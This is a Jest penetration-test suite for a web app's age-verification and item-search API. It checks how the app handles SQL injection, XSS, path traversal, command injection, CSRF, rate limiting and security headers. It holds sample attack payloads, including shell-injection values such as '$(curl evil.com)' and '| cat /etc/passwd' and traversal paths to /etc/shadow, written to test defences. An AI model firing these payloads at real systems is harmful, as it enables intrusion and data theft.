/**
 * Security Penetration Tests
 * Tests common attack vectors and security vulnerabilities
 */

const axios = require('axios');
const { describe, test, expect, beforeAll, afterAll } = require('@jest/globals');

const BASE_URL = process.env.TEST_BASE_URL || 'http://localhost:3005';

describe('Security Penetration Tests', () => {
  let server;

  beforeAll(async () => {
    // Start server if not already running
    if (!process.env.TEST_BASE_URL) {
      const app = require('../../src/index.js');
      // Server starts automatically in index.js
    }

    // Wait for server to be ready
    await new Promise(resolve => setTimeout(resolve, 2000));
  });

  describe('SQL Injection Prevention', () => {
    test('should reject SQL injection in query parameters', async () => {
      const payloads = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "1' UNION SELECT NULL,NULL,NULL--"
      ];

      for (const payload of payloads) {
        try {
          const response = await axios.get(`${BASE_URL}/api/bigquery/items`, {
            params: { search: payload },
            validateStatus: () => true
          });

          // Should either reject with 400 or sanitize input
          expect([400, 403, 404, 500]).toContain(response.status);
        } catch (error) {
          // Connection errors are acceptable (server protected itself)
          expect(error).toBeDefined();
        }
      }
    });

    test('should reject SQL injection in POST body', async () => {
      const response = await axios.post(`${BASE_URL}/api/age-verification/verify`, {
        birthdate: "1990-01-01'; DROP TABLE users; --"
      }, {
        validateStatus: () => true
      });

      expect([400, 403, 500]).toContain(response.status);
    });
  });

  describe('XSS Attack Prevention', () => {
    test('should sanitize XSS in query parameters', async () => {
      const payloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert(1)>',
        'javascript:alert(1)',
        '<svg/onload=alert(1)>'
      ];

      for (const payload of payloads) {
        const response = await axios.get(`${BASE_URL}/api/bigquery/items`, {
          params: { name: payload },
          validateStatus: () => true
        });

        // Should sanitize or reject
        if (response.data && typeof response.data === 'string') {
          expect(response.data).not.toContain('<script>');
          expect(response.data).not.toContain('javascript:');
          expect(response.data).not.toContain('onerror=');
        }
      }
    });

    test('should sanitize XSS in POST body', async () => {
      const response = await axios.post(`${BASE_URL}/api/age-verification/verify`, {
        birthdate: '1990-01-01',
        metadata: {
          userAgent: '<script>alert("XSS")</script>'
        }
      }, {
        validateStatus: () => true
      });

      // Should accept but sanitize
      if (response.status === 200 && response.data) {
        const dataStr = JSON.stringify(response.data);
        expect(dataStr).not.toContain('<script>');
      }
    });
  });

  describe('Authentication Bypass Attempts', () => {
    test('should reject requests without authentication token', async () => {
      const response = await axios.get(`${BASE_URL}/api/membership`, {
        validateStatus: () => true
      });

      // In development, auth might be disabled
      // In production, should be 401
      if (process.env.NODE_ENV === 'production') {
        expect(response.status).toBe(401);
      }
    });

    test('should reject invalid JWT tokens', async () => {
      const invalidTokens = [
        'invalid.token.here',
        'Bearer fake-token',
        'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature'
      ];

      for (const token of invalidTokens) {
        const response = await axios.get(`${BASE_URL}/api/membership`, {
          headers: {
            Authorization: token
          },
          validateStatus: () => true
        });

        // Should reject in production
        if (process.env.NODE_ENV === 'production') {
          expect([401, 403]).toContain(response.status);
        }
      }
    });

    test('should reject expired JWT tokens', async () => {
      // Token expired in 2020
      const expiredToken = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.invalid';

      const response = await axios.get(`${BASE_URL}/api/membership`, {
        headers: {
          Authorization: expiredToken
        },
        validateStatus: () => true
      });

      if (process.env.NODE_ENV === 'production') {
        expect([401, 403]).toContain(response.status);
      }
    });
  });

  describe('Rate Limiting', () => {
    test('should enforce rate limits on public endpoints', async () => {
      const requests = [];
      const endpoint = `${BASE_URL}/health`;

      // Send 350 requests (should exceed 300/minute limit)
      for (let i = 0; i < 350; i++) {
        requests.push(
          axios.get(endpoint, { validateStatus: () => true })
        );
      }

      const responses = await Promise.all(requests);
      const tooManyRequests = responses.filter(r => r.status === 429);

      // Should have rate limited some requests
      // Note: Rate limiting might be disabled in test mode
      if (process.env.RATE_LIMIT_ENABLED !== 'false') {
        expect(tooManyRequests.length).toBeGreaterThan(0);
      }
    }, 30000); // 30 second timeout

    test('should include rate limit headers', async () => {
      const response = await axios.get(`${BASE_URL}/health`, {
        validateStatus: () => true
      });

      // Should include rate limit headers
      if (process.env.RATE_LIMIT_ENABLED !== 'false') {
        expect(
          response.headers['ratelimit-limit'] ||
          response.headers['x-ratelimit-limit']
        ).toBeDefined();
      }
    });
  });

  describe('Path Traversal Prevention', () => {
    test('should reject path traversal attempts', async () => {
      const payloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        '....//....//....//etc/passwd',
        '/../../../../../../etc/shadow'
      ];

      for (const payload of payloads) {
        const response = await axios.get(`${BASE_URL}/api/files/${payload}`, {
          validateStatus: () => true
        });

        // Should reject
        expect([400, 403, 404]).toContain(response.status);
      }
    });
  });

  describe('Command Injection Prevention', () => {
    test('should prevent command injection in parameters', async () => {
      const payloads = [
        '; ls -la',
        '| cat /etc/passwd',
        '`whoami`',
        '$(curl evil.com)',
        '& ping -c 10 evil.com &'
      ];

      for (const payload of payloads) {
        const response = await axios.get(`${BASE_URL}/api/bigquery/items`, {
          params: { query: payload },
          validateStatus: () => true
        });

        // Should sanitize or reject
        expect([400, 403, 500]).toContain(response.status);
      }
    });
  });

  describe('CSRF Protection', () => {
    test('should require proper origin for state-changing requests', async () => {
      const response = await axios.post(`${BASE_URL}/api/age-verification/verify`, {
        birthdate: '1990-01-01'
      }, {
        headers: {
          'Origin': 'http://evil.com'
        },
        validateStatus: () => true
      });

      // Should reject cross-origin POST in production
      if (process.env.NODE_ENV === 'production') {
        expect([403, 500]).toContain(response.status);
      }
    });
  });

  describe('Security Headers', () => {
    test('should include security headers', async () => {
      const response = await axios.get(`${BASE_URL}/health`);

      // Check for essential security headers
      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-frame-options']).toBeDefined();
      expect(response.headers['x-xss-protection']).toBeDefined();

      // Should not expose sensitive headers
      expect(response.headers['x-powered-by']).toBeUndefined();
    });

    test('should include Content-Security-Policy', async () => {
      const response = await axios.get(`${BASE_URL}/health`);

      expect(
        response.headers['content-security-policy'] ||
        response.headers['content-security-policy-report-only']
      ).toBeDefined();
    });

    test('should include HSTS header in production', async () => {
      const response = await axios.get(`${BASE_URL}/health`);

      if (process.env.NODE_ENV === 'production') {
        expect(response.headers['strict-transport-security']).toBeDefined();
      }
    });
  });

  describe('Input Validation', () => {
    test('should reject invalid date formats', async () => {
      const invalidDates = [
        'not-a-date',
        '2025-13-45', // Invalid month/day
        '31/12/1990', // Wrong format
        '1990-01-01T00:00:00Z' // ISO format not allowed
      ];

      for (const date of invalidDates) {
        const response = await axios.post(`${BASE_URL}/api/age-verification/verify`, {
          birthdate: date
        }, {
          validateStatus: () => true
        });

        expect([400, 422]).toContain(response.status);
      }
    });

    test('should reject oversized payloads', async () => {
      // Create 20MB payload (exceeds 10MB limit)
      const largePayload = {
        birthdate: '1990-01-01',
        metadata: {
          data: 'x'.repeat(20 * 1024 * 1024)
        }
      };

      const response = await axios.post(`${BASE_URL}/api/age-verification/verify`,
        largePayload,
        {
          validateStatus: () => true,
          maxBodyLength: Infinity
        }
      );

      expect([400, 413]).toContain(response.status);
    });

    test('should reject requests with invalid content-type', async () => {
      const response = await axios.post(`${BASE_URL}/api/age-verification/verify`,
        'birthdate=1990-01-01',
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
          },
          validateStatus: () => true
        }
      );

      // Should still accept but body parsing might fail
      expect(response.status).toBeLessThan(500);
    });
  });

  describe('Age Verification Bypass Attempts', () => {
    test('should reject future birthdates', async () => {
      const futureDate = new Date();
      futureDate.setFullYear(futureDate.getFullYear() + 1);

      const response = await axios.post(`${BASE_URL}/api/age-verification/verify`, {
        birthdate: futureDate.toISOString().split('T')[0]
      }, {
        validateStatus: () => true
      });

      expect([400, 403, 422]).toContain(response.status);
    });

    test('should reject underage birthdates', async () => {
      // 20 years old (under 21)
      const underageDate = new Date();
      underageDate.setFullYear(underageDate.getFullYear() - 20);

      const response = await axios.post(`${BASE_URL}/api/age-verification/verify`, {
        birthdate: underageDate.toISOString().split('T')[0]
      }, {
        validateStatus: () => true
      });

      expect(response.status).toBe(403);
      expect(response.data.error).toContain('21');
    });

    test('should accept valid age (21+)', async () => {
      // 25 years old (valid)
      const validDate = new Date();
      validDate.setFullYear(validDate.getFullYear() - 25);

      const response = await axios.post(`${BASE_URL}/api/age-verification/verify`, {
        birthdate: validDate.toISOString().split('T')[0]
      }, {
        validateStatus: () => true
      });

      expect(response.status).toBe(200);
      expect(response.data.verified).toBe(true);
    });
  });

  describe('Denial of Service Prevention', () => {
    test('should handle concurrent requests gracefully', async () => {
      const requests = [];

      // Send 100 concurrent requests
      for (let i = 0; i < 100; i++) {
        requests.push(
          axios.get(`${BASE_URL}/health`, { validateStatus: () => true })
        );
      }

      const responses = await Promise.all(requests);
      const successCount = responses.filter(r => r.status === 200).length;

      // Most requests should succeed
      expect(successCount).toBeGreaterThan(80);
    }, 15000);

    test('should have request timeout configured', async () => {
      // This would require a slow endpoint to test properly
      // Just verify timeout is set
      const start = Date.now();

      try {
        await axios.get(`${BASE_URL}/health`, {
          timeout: 5000
        });
      } catch (error) {
        // Timeout error is expected for slow endpoints
      }

      const duration = Date.now() - start;
      expect(duration).toBeLessThan(10000); // Should timeout before 10s
    });
  });
});

module.exports = { BASE_URL };
// Last optimized: 2025-10-02
